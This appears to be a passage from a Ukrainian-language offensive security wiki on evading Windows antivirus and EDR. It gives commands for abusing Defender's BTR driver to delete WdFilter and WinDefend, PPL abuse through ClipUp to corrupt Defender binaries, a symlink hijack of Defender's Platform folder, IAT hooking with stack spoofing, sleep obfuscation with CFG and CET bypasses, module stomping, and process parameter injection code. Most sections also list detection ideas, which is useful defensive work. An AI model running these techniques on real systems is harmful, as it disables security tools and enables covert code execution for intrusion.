Для дій 5 і 6 роздільник ключа/значення у форматі on-wire — **дві послідовні зворотні скісні риски**; шлях у звичному форматі не буде правильно розділено. Файл зворотного зв’язку здебільшого повторює запит, але перші чотири байти даних кожного елемента стають його результівним `NTSTATUS`. Для дій 1 і 2, у яких немає початкового поля flags, BTR переміщує шлях у чотири зарезервовані кінцеві байти, щоб звільнити місце для цього статусу.<sup>[[36]](#references)</sup>

### Робочий процес `BTR_CLI` і вікно раннього завантаження

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) реалізує весь ланцюжок: витягує `BTR.sys` із локального Defender, створює `<random>.sys:changelist` і потік зворотного зв’язку, серіалізує/обчислює контрольні суми/шифрує послідовність дій, безпосередньо створює ключ реєстру служби, а потім викликає `NtLoadDriver` для `-trigger now` або залишає драйвер для запуску під час старту системи за допомогою `-trigger boot`. Безпосереднє налаштування реєстру оминає звичайний шлях SCM `CreateServiceW`, тож **не створює** подію встановлення служби з ID 7045. Артефакти, створені для запуску під час завантаження, можна згодом видалити командою `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` непридатний, оскільки BTR виконує файлові операції з `DriverEntry` ще до готовності стека зберігання даних і посилання `SystemRoot`. `Start=1` разом із групою високого пріоритету `Boot Bus Extender` забезпечує виконання у Phase 1: NTFS уже доступна, але багато драйверів безпеки із запуском під час старту системи та служб EDR у user mode ще не ініціалізовані. Фільтри із запуском під час старту, наприклад `WdFilter`, можуть бути вже завантажені, але BTR здатен видалити їхні бінарні файли або конфігурацію служб до наступного запуску, а також видалити виконувані файли служб до того, як їх запустить SCM. ELAM не усуває цю прогалину, оскільки BTR запускається після оцінювання драйверів, що стартують під час завантаження, і має дійсний підпис Microsoft.<sup>[[36]](#references)</sup>

Кілька дій виконуються в межах однієї транзакції. У PoC на початку додається Action 1 для жорстко заданого шляху `\SystemRoot\Temp\BootClean.log`: BTR створює цей журнал, а потім обробляє власний запит на видалення та видаляє його перед вивантаженням. Це зменшує обсяг доказів, а збереження відгуку в `<random>.sys:<random>.dat` дає змогу видалити драйвер і обидва потоки разом.<sup>[[36]](#references)[[37]](#references)</sup>

### Кореляції з високою достовірністю

Правила, що спираються лише на підпис, і список блокування вразливих драйверів Microsoft не протидіють зловживанню штатними можливостями BTR. Надавайте перевагу наведеним поведінковим кореляціям, водночас відрізняючи легітимне походження від Defender від запуску довільним засобом.<sup>[[36]](#references)</sup>

- **Sysmon 15:** створення `.sys:changelist` є невід'ємною частиною підготовки BTR. Потік ADS `.dat`, приєднаний до того самого `.sys`, є особливо підозрілим, оскільки легітимний Defender зазвичай зберігає відгуки в `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 без System 7045:** корелюйте пряме створення `HKLM\SYSTEM\CurrentControlSet\Services\<random>` із `Args=...:changelist` та `Group=Boot Bus Extender`, якщо немає відповідної події встановлення SCM.
- **Sysmon 6 -> 23:** корелюйте завантаження відомого драйвера BTR не з ланцюжка походження Defender із подальшим видаленням файлу, автором якого є `System`/PID 4, особливо якщо йдеться про бінарні файли засобів безпеки.
- **Sysmon 11 -> 23:** сповіщайте про швидке створення та видалення `\SystemRoot\Temp\BootClean.log` процесом `System`/PID 4.
- Обмежуйте й аудіюйте надання/увімкнення `SeLoadDriverPrivilege`; одного лише підпису Microsoft недостатньо, щоб вважати драйвер надійним, якщо драйвер засобу безпеки підготовлений через `cmd.exe`, PowerShell або невідомий процес.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) забезпечує ієрархію підписувачів і рівнів, за якої втручатися одне в одного можуть лише захищені процеси з таким самим або вищим рівнем. В атакувальних цілях, якщо ви можете легітимно запустити бінарний файл із підтримкою PPL і контролювати його аргументи, можна перетворити нешкідливу функціональність (наприклад, ведення журналу) на обмежений примітив запису із захистом PPL у захищені каталоги, які використовують AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Що потрібно, щоб процес працював як PPL
- Цільовий EXE (і всі завантажені DLL) мають бути підписані EKU, сумісним із PPL.
- Процес потрібно створити за допомогою CreateProcess із прапорцями: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запросити сумісний рівень захисту, що відповідає підписувачу бінарного файлу (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписувачів засобів захисту від шкідливого ПЗ, `PROTECTION_LEVEL_WINDOWS` для підписувачів Windows). Неправильний рівень призведе до помилки створення процесу.

Див. також ширший вступ до PP/PPL і захисту LSASS тут:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти для запуску
- Допоміжний інструмент із відкритим кодом: CreateProcessAsPPL (вибирає рівень захисту та передає аргументи цільовому EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Приклад використання:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN-примітив: ClipUp.exe
- Підписаний системний бінарний файл `C:\Windows\System32\ClipUp.exe` запускає дочірній процес і приймає параметр для запису файлу журналу за вказаним користувачем шляхом.
- Якщо його запущено як процес PPL, файл записується з рівнем захисту PPL.
- ClipUp не може обробляти шляхи з пробілами; використовуйте короткі шляхи 8.3, щоб вказати на зазвичай захищені розташування.

Допоміжні засоби для коротких шляхів 8.3
- Переглянути короткі імена: `dir /x` у кожному батьківському каталозі.
- Отримати короткий шлях у cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Ланцюжок зловживання (загальна схема)
1) Запустіть LOLBIN із підтримкою PPL (ClipUp) із прапорцем `CREATE_PROTECTED_PROCESS` за допомогою засобу запуску (наприклад, CreateProcessAsPPL).
2) Передайте ClipUp аргумент зі шляхом до файлу журналу, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте короткі імена 8.3.
3) Якщо AV зазвичай відкриває/блокує цільовий бінарний файл під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження системи, до запуску AV, встановивши службу автозапуску, яка гарантовано запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (журналювання завантаження).
4) Після перезавантаження запис із рівнем захисту PPL виконується до того, як AV заблокує свої бінарні файли, пошкоджуючи цільовий файл і перешкоджаючи запуску.

Приклад виклику (шляхи приховано/скорочено з міркувань безпеки):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Примітки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp, лише місце запису; цей примітив підходить для пошкодження, а не для точного впровадження вмісту.
- Для встановлення/запуску служби потрібні локальні права адміністратора/SYSTEM і можливість перезавантаження.
- Час має вирішальне значення: цільовий файл не повинен бути відкритим; виконання під час завантаження дає змогу уникнути блокувань файлів.

Виявлення
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо його запускають нестандартні батьківські процеси під час завантаження.
- Нові служби, налаштовані на автоматичний запуск підозрілих бінарних файлів і запуск перед Defender/AV. Перевіряйте створення/зміну служб перед збоями запуску Defender.
- Моніторинг цілісності файлів бінарних файлів Defender/каталогів Platform; неочікуване створення/зміна файлів процесами з прапорцями захищеного процесу.
- Телеметрія ETW/EDR: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, і аномальне використання рівня PPL бінарними файлами, що не належать до AV.

Заходи пом’якшення
- WDAC/Code Integrity: обмежте, які підписані бінарні файли можуть запускатися як PPL і з якими батьківськими процесами; блокуйте запуск ClipUp поза легітимними контекстами.
- Гігієна служб: обмежте створення/зміну служб із автоматичним запуском і відстежуйте маніпуляції порядком запуску.
- Переконайтеся, що захист від втручання Defender і захист на ранньому етапі завантаження ввімкнені; перевіряйте помилки запуску, що вказують на пошкодження бінарних файлів.
- Якщо це сумісно з вашим середовищем, розгляньте можливість вимкнення створення коротких імен 8.3 на томах, де розміщені засоби безпеки (ретельно протестуйте).

## Підміна Microsoft Defender через перехоплення symlink папки версії Platform

Windows Defender вибирає платформу для запуску, перелічуючи підпапки в:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він вибирає підпапку з найвищим лексикографічним значенням рядка версії (наприклад, `4.18.25070.5-0`), а потім запускає звідти процеси служби Defender (відповідно оновлюючи шляхи служби/реєстру). Під час цього вибору він довіряє записам каталогів, зокрема точкам повторної обробки каталогів (symlink). Адміністратор може скористатися цим, щоб перенаправити Defender до шляху, доступного для запису зловмисником, і виконати DLL sideloading або порушити роботу служби.<sup>[[21]](#references)[[22]](#references)</sup>

Передумови
- Локальний адміністратор (потрібен для створення каталогів/symlink у папці Platform)
- Можливість перезавантажити систему або запустити повторний вибір платформи Defender (перезапуск служби під час завантаження)
- Потрібні лише вбудовані інструменти (mklink)

Чому це працює
- Defender блокує запис у власні папки, але під час вибору платформи довіряє записам каталогів і вибирає найвище лексикографічне значення версії, не перевіряючи, чи веде ціль до захищеного/довіреного шляху.

Покроково (приклад)
1) Підготуйте доступну для запису копію поточної папки платформи, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть у Platform символьне посилання на каталог із вищою версією, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендується перезавантаження):
```cmd
shutdown /r /t 0
```
4) Переконайтеся, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Слідкуйте за новим шляхом процесу в `C:\TMP\AV\` і за конфігурацією служби/реєстром, у яких має бути вказано це розташування.

Варіанти post-exploitation
- DLL sideloading/виконання коду: розмістіть або замініть DLL, які Defender завантажує з каталогу програми, щоб виконати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Зупинка служби/відмова в обслуговуванні: видаліть symlink версії, щоб під час наступного запуску налаштований шлях не вказував на ціль, і Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Зверніть увагу: ця техніка сама по собі не забезпечує підвищення привілеїв; для її використання потрібні права адміністратора.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть перенести runtime evasion із C2 implant безпосередньо в цільовий модуль, перехопивши його Import Address Table (IAT) і скерувавши вибрані API через керований зловмисником position-independent code (PIC). Це узагальнює evasion за межами невеликого набору API, доступного в багатьох kits (наприклад, CreateProcessA), і поширює ті самі засоби захисту на BOFs і post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Підхід на високому рівні
- Розмістіть PIC blob поруч із цільовим модулем за допомогою reflective loader (на початку або як супровідний файл). PIC має бути самодостатнім і position-independent.
- Під час завантаження host DLL пройдіть її IMAGE_IMPORT_DESCRIPTOR і пропатчте записи IAT для цільових imports (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC wrappers.
- Кожен PIC wrapper виконує evasion перед tail-call до адреси реального API. Типові evasion включають:
  - Маскування/розмаскування пам’яті навколо виклику (наприклад, шифрування областей beacon, RWX→RX, зміна назв/дозволів сторінок), а потім відновлення після виклику.
  - Call-stack spoofing: створення нешкідливого стека й перехід до цільового API, щоб аналіз call stack визначав очікувані фрейми.<sup>[[9]](#references)</sup>
- Для сумісності експортуйте інтерфейс, щоб Aggressor script (або еквівалент) міг реєструвати API для перехоплення в Beacon, BOFs і post-ex DLLs.

Навіщо тут IAT hooking
- Працює з будь-яким кодом, який використовує перехоплений import, без змін у коді інструмента й без залежності від того, що Beacon проксуватиме певні API.
- Охоплює post-ex DLLs: перехоплення LoadLibrary* дає змогу перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати те саме маскування/обхід аналізу стека до їхніх викликів API.
- Відновлює надійне використання post-ex команд, що створюють процеси, проти засобів виявлення на основі call stack шляхом обгортання CreateProcessA/W.

Мінімальний ескіз IAT hook (псевдокод x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Нотатки
- Застосовуйте patch після relocations/ASLR і до першого використання імпорту. Reflective loaders на кшталт TitanLdr/AceLdr демонструють hooking під час DllMain завантаженого модуля.
- Залишайте wrappers невеликими та PIC-safe; визначайте справжній API через початкове значення IAT, збережене до patching, або через LdrGetProcedureAddress.
- Для PIC використовуйте переходи RW → RX і не залишайте сторінки з одночасними правами запису й виконання.

Заглушка для call-stack spoofing
- PIC stubs у стилі Draugr будують фальшивий ланцюжок викликів (return addresses у нешкідливих модулях), а потім переходять до справжнього API.
- Це обходить виявлення, що очікують канонічні стеки від Beacon/BOFs під час викликів чутливих API.
- Поєднуйте це з методами stack cutting/stack stitching, щоб опинитися в очікуваних фреймах до прологу API.

Операційна інтеграція
- Розміщуйте reflective loader на початку post-ex DLLs, щоб PIC і hooks автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте Aggressor script для реєстрації цільових API, щоб Beacon і BOFs прозоро отримували той самий шлях evasion без змін коду.

Міркування щодо виявлення/DFIR
- Цілісність IAT: записи, що вказують на адреси поза image (heap/anon); періодична перевірка import pointers.
- Аномалії стека: return addresses, що не належать завантаженим images; різкі переходи до не-image PIC; невідповідна ancestry RtlUserThreadStart.
- Телеметрія loader: записи в IAT зсередини процесу, рання активність DllMain, що змінює import thunks, неочікувані RX-регіони, створені під час завантаження.
- Обхід image-load виявлення: якщо виконується hooking LoadLibrary*, відстежуйте підозрілі завантаження automation/clr assemblies, пов’язані з подіями маскування пам’яті.

Пов’язані building blocks і приклади
- Reflective loaders, що виконують IAT patching під час завантаження (наприклад, TitanLdr, AceLdr)
- Hooks маскування пам’яті (наприклад, simplehook) і PIC для stack cutting (stackcutting)
- PIC stubs для call-stack spoofing (наприклад, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks через resident PICO

Якщо ви контролюєте reflective loader, можна встановлювати hooks **під час** `ProcessImports()`, замінивши вказівник loader на `GetProcAddress` власним resolver, який спершу перевіряє hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Створіть **resident PICO** (persistent PIC object), який зберігається після того, як transient loader PIC звільняє себе.
- Експортуйте функцію `setup_hooks()`, яка перезаписує import resolver loader (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте ordinal imports і використовуйте пошук hook на основі hash, наприклад `__resolve_hook(ror13hash(name))`. Якщо hook знайдено, поверніть його; інакше передайте виклик справжньому `GetProcAddress`.
- Реєструйте цілі hooks під час link time за допомогою записів Crystal Palace `addhook "MODULE$Func" "hook"`. Hook залишається чинним, бо розташований усередині resident PICO.

Це забезпечує **import-time IAT redirection** без patching code section завантаженої DLL після завантаження.

### Примусове додавання hookable imports, якщо ціль використовує PEB-walking

Import-time hooks спрацьовують лише тоді, коли функція фактично є в IAT цілі. Якщо модуль знаходить APIs через PEB-walk + hash (без запису імпорту), примусово додайте справжній імпорт, щоб шлях `ProcessImports()` у loader його обробив:

- Замініть пошук hashed exports (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) прямим посиланням на кшталт `&WaitForSingleObject`.
- Компілятор створить запис IAT, що дасть змогу перехопити виклик під час обробки імпортів reflective loader.

### Обфускація під час сну/простою у стилі Ekko без patching `Sleep()`

Замість patching `Sleep` встановлюйте hooks на **фактичні примітиви очікування/IPC**, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалого очікування обгорніть виклик у ланцюжок обфускації у стилі Ekko, який шифрує образ у пам’яті під час простою:<sup>[[31]](#references)[[27]](#references)</sup>

- Використовуйте `CreateTimerQueueTimer` для планування послідовності callbacks, які викликають `NtContinue` з підготовленими фреймами `CONTEXT`.
- Типовий ланцюжок (x64): перевести образ у `PAGE_READWRITE` → зашифрувати RC4 через `advapi32!SystemFunction032` увесь mapped image → виконати блокувальне очікування → розшифрувати RC4 → **відновити дозволи для кожної секції**, проходячи PE sections → подати сигнал про завершення.
- `RtlCaptureContext` надає шаблон `CONTEXT`; клонуйте його в кілька фреймів і задайте регістри (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Операційна деталь: повертайте “success” для тривалого очікування (наприклад, `WAIT_OBJECT_0`), щоб caller продовжив виконання, поки образ замасковано. Такий підхід приховує модуль від сканерів під час простою та уникає класичної сигнатури “patched `Sleep()`”.

Ідеї для виявлення (на основі телеметрії)
- Сплески callbacks `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` для великих суцільних буферів розміром з image.
- `VirtualProtect` для великого діапазону з подальшим відновленням дозволів для кожної секції власним кодом.

### Runtime CFG registration для sleep-obfuscation gadgets

У цілях із CFG перший непрямий перехід до gadget посеред функції, наприклад `jmp [rbx]` або `jmp rdi`, зазвичай призведе до аварійного завершення процесу з `STATUS_STACK_BUFFER_OVERRUN`, оскільки gadget відсутній у CFG metadata модуля. Щоб ланцюжки у стилі Ekko/Kraken працювали в захищених процесах:<sup>[[30]](#references)</sup>

- Зареєструйте кожну непряму адресу призначення, яку використовує ланцюжок, через `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` і записи `CFG_CALL_TARGET_VALID`.
- Для адрес усередині завантажених images (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **базової адреси image** і охоплювати **повний розмір image**.
- Для вручну mapped/PIC/stomped регіонів використовуйте натомість **базу allocation** і його розмір.
- Позначайте не лише dispatch gadget, а й exports, до яких відбувається непрямий перехід (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), а також будь-які executable sections під контролем атакувальника, які стануть непрямими цілями.

Це перетворює sleep chains у стилі ROP/JOP із “працює лише в процесах без CFG” на багаторазово використовуваний примітив для `explorer.exe`, браузерів, `svchost.exe` та інших endpoints, зібраних із `/guard:cf`.

### CET-safe stack spoofing для потоків у стані сну

Повна заміна `CONTEXT` помітна й може не працювати в системах із CET Shadow Stack, оскільки підмінений `Rip` усе одно має відповідати апаратному shadow stack. Безпечніший шаблон маскування під час сну:<sup>[[30]](#references)</sup>

- Виберіть інший потік у тому самому процесі й прочитайте межі стека `NT_TIB` / TEB (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Збережіть справжній TEB/TIB поточного потоку.
- Зафіксуйте справжній контекст потоку, що засинає, за допомогою `GetThreadContext`.
- Скопіюйте в підроблений контекст **лише** справжній `Rip`, залишивши підроблені `Rsp`/стан стека без змін.
- Під час сну скопіюйте `NT_TIB` підробленого потоку в TEB поточного потоку, щоб stack walkers виконували unwind у межах легітимного діапазону стека.
- Після завершення очікування відновіть початкові TIB і контекст потоку.

Це зберігає узгоджений із CET вказівник інструкції, водночас вводячи в оману EDR stack walkers, які довіряють метаданим стека TEB для перевірки unwind.

### Альтернатива на основі APC: Kraken Mask

Якщо dispatch через timer-queue має надто впізнавану сигнатуру, ту саму послідовність sleep-encrypt-spoof-restore можна виконати з призупиненого helper thread за допомогою queued APCs:<sup>[[27]](#references)</sup>

- Створіть helper thread із `NtTestAlert` як entrypoint.
- Поставте підготовлені фрейми `CONTEXT`/APCs у чергу через `NtQueueApcThread` і виконайте їх через `NtAlertResumeThread`.
- Зберігайте стан ланцюжка в heap, а не в стеку helper thread, щоб не вичерпати стандартний стек потоку розміром 64 KB.
- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно подати сигнал про початок і заблокувати виконання.
- Призупиніть основний потік перед відновленням TIB/контексту (`NtSuspendThread` → restore → `NtResumeThread`), щоб зменшити вікно гонки, у якому сканер може побачити частково відновлений стек.

Це замінює сигнатуру `CreateTimerQueueTimer` + `NtContinue` на сигнатуру helper-thread/APC, зберігаючи ті самі цілі маскування RC4 і stack spoofing.

Додаткові ідеї для виявлення
- `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` незадовго до сну, очікування або APC dispatch.
- Виклики `GetThreadContext`/`SetThreadContext` навколо `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- Виклик `NtQueryInformationThread` із подальшим прямим записом у межі стека TEB/TIB поточного потоку.
- Ланцюжки `NtQueueApcThread`/`NtAlertResumeThread`, які опосередковано викликають `SystemFunction032`, `VirtualProtect` або helpers для відновлення дозволів секцій.
- Повторне використання коротких сигнатур gadgets, таких як `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`), як dispatch pivots усередині підписаних модулів.


## Precision Module Stomping

Module stomping виконує payloads із **секції `.text` DLL, уже mapped усередині цільового процесу**, замість виділення очевидної приватної executable memory або завантаження нової sacrificial DLL. Ціллю для перезапису має бути **завантажений, disk-backed image**, чий code space вмістить payload, не пошкодивши шляхи виконання коду, які ще потрібні процесу.<sup>[[1]](#references)[[2]](#references)</sup>

### Надійний вибір цілі

Наївний stomping поширених модулів, таких як `uxtheme.dll` або `comctl32.dll`, ненадійний: DLL може бути не завантажена у віддалений процес, а надто мала code region призведе до аварійного завершення процесу. Надійніший підхід:

1. Перелічіть модулі цільового процесу й залиште **список включення лише з назвами** вже завантажених DLL.
2. Спершу створіть payload і зафіксуйте його **точний розмір у байтах**.
3. Проскануйте DLL-кандидати на диску та порівняйте розмір PE-секції **`.text` `Misc_VirtualSize`** із розміром payload. Це важливіше за розмір файла, оскільки відображає розмір executable section **після завантаження в пам’ять**.
4. Розберіть **Export Address Table (EAT)** і виберіть RVA експортованої функції як початкове зміщення для stomp.
5. Оцініть **радіус впливу**: якщо payload перевищує межі вибраної функції, він перезапише сусідні exports, розташовані після неї в пам’яті.

Типові допоміжні засоби для розвідки/вибору цілей, які трапляються на практиці:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Операційні примітки
- Віддавайте перевагу DLL, які **вже завантажені** у віддалений процес, щоб уникнути телеметрії `LoadLibrary` / неочікуваного завантаження образів.
- Віддавайте перевагу експорту, який цільова програма виконує рідко; інакше звичайні шляхи виконання коду можуть зачепити перезаписані байти до або після створення потоку.
- Для великих імплантів часто потрібно замінити вбудовування shellcode у вигляді рядкового літерала на **масив байтів / ініціалізатор у фігурних дужках**, щоб у вихідному коді інжектора було правильно представлено весь буфер.

Ідеї для виявлення
- Віддалений запис в **ісполняємі сторінки, прив’язані до образу** (`MEM_IMAGE`, `PAGE_EXECUTE*`) замість поширеніших приватних виділень RWX/RX.
- Точки входу експорту, байти яких у пам’яті більше не відповідають файлу-джерелу на диску.
- Віддалені потоки або перемикання контексту, що починають виконання всередині експорту легітимної DLL, перші байти якого нещодавно змінили.
- Підозрілі послідовності `VirtualProtect(Ex)` / `WriteProcessMemory` для сторінок `.text` DLL, після яких створюється потік.

## Отруєння параметрів процесу (P3)

Отруєння параметрів процесу (P3) — це техніка **ін’єкції в процес / обходу EDR**, яка уникає класичного шляху віддаленого запису (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання байтів у вже запущений цільовий процес вона використовує той факт, що Windows **копіює вибрані параметри запуску `CreateProcessW` у дочірній процес** і зберігає їх у `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Носії, які можна отруїти й які копіює `CreateProcessW`

Корисні носії:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (з `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Практичні обмеження носіїв:

- `lpCommandLine` має вказувати на **доступну для запису пам’ять** для `CreateProcessW`; максимальна довжина — **32 767 символів Unicode** разом із нуль-термінатором.
- `lpEnvironment` має бути блоком середовища Unicode з послідовними рядками `NAME=VALUE\0`, завершеними додатковим `\0`.
- `lpReserved` офіційно зарезервований, тому відповідність `ShellInfo` слід вважати деталлю реалізації, а не стабільним задокументованим контрактом.

Це перетворює звичайне створення процесу на **примітив передавання payload**. Оператор створює дочірній процес із даними запуску, контрольованими зловмисником, а Windows виконує копіювання між процесами.

### Отримання адреси віддаленого буфера без API віддаленого запису

Після створення дочірнього процесу знайдіть скопійований буфер за допомогою **примітивів лише для читання**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримати `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитати віддалений `PEB`
3. Перейти за вказівником `PEB.ProcessParameters`
4. Прочитати `RTL_USER_PROCESS_PARAMETERS`
5. Використати вибраний вказівник:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Мінімальна послідовність:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не виконувана. Типовий ланцюжок P3:

1. Створити процес звичайним способом (не призупиняючи його)
2. Зробити вибрану сторінку параметрів виконуваною за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати дескриптор головного потоку, вже повернутий у `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних сценаріїв перехоплення потоку, тут **не потрібні** `SuspendThread` / `ResumeThread`; контекст можна змінити безпосередньо через дескриптор головного потоку, що повертається.

Це дає змогу уникнути кількох API, які часто відстежуються під час ін’єкції:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження нульового байта та багатоступеневий shellcode

Усі три носії містять **рядкові або рядкоподібні дані**, тому під час передавання необроблене навантаження з `0x00` обрізається. Практичний спосіб обійти це — **перший етап без нульових байтів**, який відновлює константи під час виконання, а потім завантажує довільний другий етап.

Проста схема — синтезування констант на основі XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Це дає змогу першому етапу створювати рядки у стеку, аргументи API, шляхи до DLL або завантажувач shellcode другого етапу, не вбудовуючи нульові байти в переданий параметр.

### Виклики API зі стеку на першому етапі

Якщо першому етапу потрібно викликати API, наприклад `LoadLibraryA`, він може:

- помістити рядок/буфер у стек цільового процесу
- зарезервувати **32-байтову shadow space для x64**
- задати `RCX`, `RDX`, `R8`, `R9` константами або вказівниками відносно `RSP`
- забезпечити **16-байтове вирівнювання** `RSP` перед викликом

Потім другий етап можна скопіювати зі стеку в область пам’яті `PAGE_READWRITE`, змінити її захист на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect` і перейти до неї, уникаючи прямого виділення пам’яті з правами RWX.

### Ідеї для виявлення

Автори згадують такі перспективні напрямки для пошуку:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, які надають сторінкам параметрів процесу право на виконання
- зміна захисту, за якою йде `SetThreadContext` / `NtSetContextThread`
- віддалене читання `PEB`, а потім `RTL_USER_PROCESS_PARAMETERS`
- незвично довгі значення або значення з високою ентропією в `lpCommandLine`, `lpEnvironment` або `STARTUPINFO.lpReserved` під час створення процесу

### Примітки

- P3 — це **трюк для передавання даних між процесами**, а не самостійний механізм виконання: скопійованому параметру все ще потрібна зміна дозволу на виконання та метод перенаправлення виконання.
- Автори розглядали `RtlCreateProcessReflection` / Dirty Vanity, але відмовилися від цього варіанта, оскільки він усередині використовує підозрілі примітиви, зокрема `NtWriteVirtualMemory` і `NtCreateThreadEx`.

## Тактики SantaStealer для безфайлового обходу виявлення та викрадення облікових даних

